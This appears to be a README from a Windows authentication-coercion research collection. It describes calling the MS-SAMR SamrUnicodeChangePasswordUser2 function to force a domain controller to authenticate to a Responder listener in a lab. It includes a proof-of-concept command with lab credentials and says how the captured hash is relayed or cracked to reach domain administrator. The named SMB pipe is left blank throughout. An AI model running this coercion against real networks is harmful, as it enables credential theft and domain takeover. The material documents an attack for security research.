# MS-SAMR - Remote call to SamrUnicodeChangePasswordUser2 (opnum 55)

## Summary

 - **Protocol**: [[MS-SAMR]: Security Account Manager (SAM) Remote Protocol (Client-to-Server)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/4df07fab-1bbc-452f-8e92-7853a3c7e380)

 - **Protocol UUID**: 12345778-1234-abcd-ef00-0123456789ac

 - **Protocol version**: 1.0

 - **SMB Named pipe**: ``

 - **Function name**: [`SamrUnicodeChangePasswordUser2`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/acb3204a-da8b-478e-9139-1ea589edb880)

 - **Function operation number**: `55`

 - **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `` and bind to the desired [`MS-SAMR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/4df07fab-1bbc-452f-8e92-7853a3c7e380) protocol (with uuid `12345778-1234-abcd-ef00-0123456789ac` and version `1.0`) in order to perform remote procedure calls to functions in the [`MS-SAMR`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/4df07fab-1bbc-452f-8e92-7853a3c7e380) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `` This pipe is connected to the protocol [[MS-SAMR]: Security Account Manager (SAM) Remote Protocol (Client-to-Server)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/4df07fab-1bbc-452f-8e92-7853a3c7e380) and allows to call RPC functions of this protocol. We will then call the remote [`SamrUnicodeChangePasswordUser2`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/acb3204a-da8b-478e-9139-1ea589edb880) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
SamrUnicodeChangePasswordUser2('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
long SamrUnicodeChangePasswordUser2(
   [in] handle_t BindingHandle,
   [in, unique] PRPC_UNICODE_STRING ServerName,
   [in] PRPC_UNICODE_STRING UserName,
   [in, unique] PSAMPR_ENCRYPTED_USER_PASSWORD NewPasswordEncryptedWithOldNt,
   [in, unique] PENCRYPTED_NT_OWF_PASSWORD OldNtOwfPasswordEncryptedWithNewNt,
   [in] unsigned char LmPresent,
   [in, unique] PSAMPR_ENCRYPTED_USER_PASSWORD NewPasswordEncryptedWithOldLm,
   [in, unique] PENCRYPTED_LM_OWF_PASSWORD OldLmOwfPasswordEncryptedWithNewNt
 );
```

## References

 - Documentation of protocol [MS-SAMR]: Security Account Manager (SAM) Remote Protocol (Client-to-Server): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/4df07fab-1bbc-452f-8e92-7853a3c7e380

 - Documentation of function `SamrUnicodeChangePasswordUser2`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/acb3204a-da8b-478e-9139-1ea589edb880